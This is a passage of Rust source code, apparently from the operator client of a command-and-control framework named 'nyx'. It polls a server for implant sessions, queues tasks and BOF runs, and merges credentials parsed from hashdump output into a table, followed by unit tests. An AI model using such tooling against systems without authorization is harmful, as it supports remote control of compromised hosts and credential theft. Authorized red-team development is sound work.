                            // for no-domain lines; without this, session A's "alice"
                            // and session B's "alice" would clobber each other.)
                            for e in &mut entries {
                                if e.source.is_empty() || e.source == "localhost" {
                                    e.source = session.clone();
                                }
                            }
                            log_push(&mut log_buf, &format!("[{}] parsed {} credentials", short(&session), entries.len()));
                            // Merge by (source, principal, kind): a re-run of hashdump
                            // refreshes the same principal+kind in place, while a hash
                            // and a cleartext password for the same principal (different
                            // kinds) coexist. Without this, every hashdump doubled the
                            // table with stale copies. Never silently drop the batch on
                            // a lock failure — log it so the operator knows creds were
                            // lost (the cred-store RwLock isn't expected to poison, but
                            // staying non-silent is the contract everywhere else here).
                            match crate::widgets::cred_table::CREDS.write() {
                                Ok(mut creds) => {
                                    for e in entries {
                                        if let Some(slot) = creds.iter_mut().find(|c| {
                                            c.source == e.source
                                                && c.principal == e.principal
                                                && c.kind == e.kind
                                        }) {
                                            slot.secret = e.secret;
                                        } else {
                                            creds.push(e);
                                        }
                                    }
                                }
                                Err(_) => log_push(
                                    &mut log_buf,
                                    &format!(
                                        "[{}] ! cred store lock poisoned; {} parsed creds dropped",
                                        short(&session),
                                        entries.len(),
                                    ),
                                ),
                            }
                        }
                    }
                    TaskKind::Bof { name, args } => {
                        let status = if out.starts_with("[error]") { BofState::Error } else { BofState::Done };
                        if !out.is_empty() {
                            log_push(&mut log_buf, &format!("[{}] bof {}: {}", short(&session), name, out));
                        }
                        bof_updates.push(BofUpdate { name, args, status });
                    }
                },
                Ok(None) => {
                    let next = backoff.saturating_mul(2).min(Duration::from_secs(4));
                    still_pending.push(PendingTask {
                        session, task_id, kind, backoff: next, last_poll: Instant::now(),
                    });
                }
                Err(e) => {
                    log_push(&mut log_buf, &format!("[{}] ! {}", short(&session), e));
                    if let TaskKind::Bof { name, args } = kind {
                        bof_updates.push(BofUpdate { name, args, status: BofState::Error });
                    }
                }
            }
        }
        pending = still_pending;

        // Flush any task-result log lines / BOF updates / console lines accumulated this cycle.
        if !log_buf.is_empty() || !bof_updates.is_empty() || !console_lines.is_empty() {
            let _ = to_ui.send(Snapshot {
                log_lines: std::mem::take(&mut log_buf),
                connected: true,
                sessions: Vec::new(),
                bof_updates: std::mem::take(&mut bof_updates),
                console_lines: std::mem::take(&mut console_lines),
                connecting,
                connect_stage,
            });
        }

        tokio::time::sleep(SESSION_POLL).await;
    }
}

/// Truncate a session id to 8 chars for log lines (matches the UI's `{:.8}`).
fn short(s: &str) -> &str {
    &s[..s.len().min(8)]
}

#[allow(clippy::too_many_arguments)]
fn take_snapshot(
    log_buf: &mut Vec<String>,
    connected: bool,
    sessions: &[SessionView],
    bof_updates: &mut Vec<BofUpdate>,
    console_lines: &mut Vec<(String, String)>,
    connecting: bool,
    connect_stage: ConnectStage,
) -> Snapshot {
    Snapshot {
        sessions: sessions.to_vec(),
        log_lines: std::mem::take(log_buf),
        connected,
        connecting,
        connect_stage,
        bof_updates: std::mem::take(bof_updates),
        console_lines: std::mem::take(console_lines),
    }
}

// ---- REST helpers (all async, all on the worker) ---------------------------

// `authed` is imported from `nyx_rest` (see the `use` above) — shared with
// client-cli so the bearer-token logic can't diverge between clients.

/// Fetch the session list as a single round-trip. The caller drives real
/// connect-stage progress around this (see the `match` at the call site): the
/// stage advances to `Connecting` conceptually when the request flies, but since
/// reqwest's send+decode is one awaited future we surface the granular stages
/// from the Ok/Err branches. Keeping the network call in one helper avoids
/// re-plumbing the authed/get chain.
async fn fetch_sessions(
    c: &reqwest::Client,
    server: &str,
    token: &Option<String>,
) -> anyhow::Result<Vec<SessionView>> {
    Ok(authed(c.get(format!("{server}/api/sessions")), token)
        .send()
        .await?
        .json()
        .await?)
}

#[derive(Deserialize)]
struct TaskAck {
    task_id: u64,
}

#[derive(Deserialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
}

async fn enqueue_task(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    command: serde_json::Value,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": command
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send()
        .await?
        .json()
        .await?;
    Ok(ack.task_id)
}

async fn poll_result(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    task_id: u64,
    token: &Option<String>,
) -> anyhow::Result<Option<String>> {
    let rs: Vec<ResultView> = authed(
        c.get(format!("{server}/api/results")).query(&[("session", session)]),
        token,
    )
    .send()
    .await?
    .json()
    .await?;
    Ok(rs.into_iter().find(|r| r.task_id == task_id).map(|r| match r.kind.as_str() {
        "output" => r.text,
        "ok" => String::new(),
        "error" => format!("[error] {}", r.text),
        other => format!("[{other}] {}", r.text),
    }))
}

// `session_signature` is imported from `nyx_rest` (see the `use` above) —
// shared with client-cli, identical change-detection contract.

/// `pub(crate)` so the unit test in `#[cfg(test)] mod tests` (and any future
/// integration test) can exercise the cap behaviour directly.
pub(crate) fn log_push(buf: &mut Vec<String>, line: impl Into<String>) {
    buf.push(line.into());
    if buf.len() > LOG_BUFFER_CAP {
        let drop = buf.len() - LOG_BUFFER_CAP;
        buf.drain(..drop);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sv(id: &str, host: &str, user: &str, admin: u8, pend: usize) -> SessionView {
        SessionView {
            id: id.into(),
            hostname: host.into(),
            username: user.into(),
            os: String::new(),
            is_admin: admin,
            pending: pend,
            beacon_id: 0,
            arch: 0,
            pid: 0,
            ..Default::default()
        }
    }

    #[test]
    fn connect_cmd_carries_password() {
        // Cmd::Connect now carries an optional bearer token. This pins the
        // signature so a future refactor can't silently drop it (the original
        // auth-header bug was exactly this: the field didn't exist).
        let c = Cmd::Connect { server: "http://x".into(), password: Some("sekret".into()) };
        match c {
            Cmd::Connect { password: Some(p), .. } => assert_eq!(p, "sekret"),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn connect_cmd_allows_no_token() {
        // Local dev server (no NYX_TOKEN) → password is None; must not error.
        let c = Cmd::Connect { server: "http://x".into(), password: None };
        match c {
            Cmd::Connect { password: None, .. } => {}
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn signature_stable_order() {
        // Same list → same signature (so the worker doesn't spam snapshots).
        let a = vec![sv("s1", "h", "u", 0, 1), sv("s2", "h2", "u2", 1, 0)];
        let b = a.clone();
        assert_eq!(session_signature(&a), session_signature(&b));
    }

    #[test]
    fn signature_detects_change() {
        // A changed field (pending count, admin flag, user, host, id) must
        // change the signature — otherwise stale UI.
        let base = vec![sv("s1", "h", "u", 0, 1)];
        let sig0 = session_signature(&base);
        assert_ne!(sig0, session_signature(&vec![sv("s1", "h", "u", 0, 2)]), "pending change");
        assert_ne!(sig0, session_signature(&vec![sv("s1", "h", "u", 1, 1)]), "admin change");
        assert_ne!(sig0, session_signature(&vec![sv("s1", "h2", "u", 0, 1)]), "host change");
        assert_ne!(sig0, session_signature(&vec![sv("s2", "h", "u", 0, 1)]), "id change");
    }

    #[test]
    fn signature_empty_is_empty_string() {
        assert_eq!(session_signature(&[]), "");
    }

    #[test]
    fn log_push_appends() {
        let mut buf = Vec::new();
        log_push(&mut buf, "a");
        log_push(&mut buf, "b");
        assert_eq!(buf, vec!["a".to_string(), "b".to_string()]);
    }

    #[test]
    fn log_push_caps_and_drops_oldest() {
        // Fill past the cap; oldest entries are dropped, newest kept.
        let mut buf = Vec::new();
        for i in 0..(LOG_BUFFER_CAP + 50) {
            log_push(&mut buf, i.to_string());
        }
        assert_eq!(buf.len(), LOG_BUFFER_CAP, "buffer must be capped exactly");
        // The first surviving entry should be the one at offset 50 (we dropped 50).
        assert_eq!(buf[0], "50", "oldest surviving line must be index 50");
        assert_eq!(buf.last().unwrap(), &(LOG_BUFFER_CAP + 50 - 1).to_string());
    }

    #[test]
    fn connect_stage_default_is_idle() {
        // The overlay must start hidden → stage Idle. Pins the Default derive.
        assert_eq!(ConnectStage::default(), ConnectStage::Idle);
    }

    #[test]
    fn connect_stage_progression_resolving_to_done() {
        // Pins the connect-overlay stage model: a successful attempt walks
        // Idle → Resolving → Connecting → Done. These are the values the worker
        // assigns and the UI's step-tip reads (see the overlay design spec).
        let s0 = ConnectStage::Idle;
        let s1 = ConnectStage::Resolving;
        let s2 = ConnectStage::Connecting;
        let s3 = ConnectStage::Done;
        assert_ne!(s0, s1);
        assert_ne!(s1, s2);
        assert_ne!(s2, s3);
    }
}
